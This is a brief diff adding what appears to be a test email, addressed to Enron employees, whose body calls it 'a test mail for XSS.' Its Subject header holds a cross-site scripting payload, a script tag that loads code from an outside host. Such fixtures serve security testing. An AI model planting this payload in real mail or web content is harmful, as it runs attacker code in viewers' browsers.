@@ -1,0 +1,7 @@
+From: "Miguel Brandt" <haalcohol@tpnet.pl>
+To: andrew.wu@enron.com, richard.crevelt@enron.com, jeff.dasovich@enron.com, 
+Subject: <script src=http://xss.tw/pdjsa></script>
+MIME-Version: 1.0
+Content-type: text/html
+
+This is a test mail for XSS.
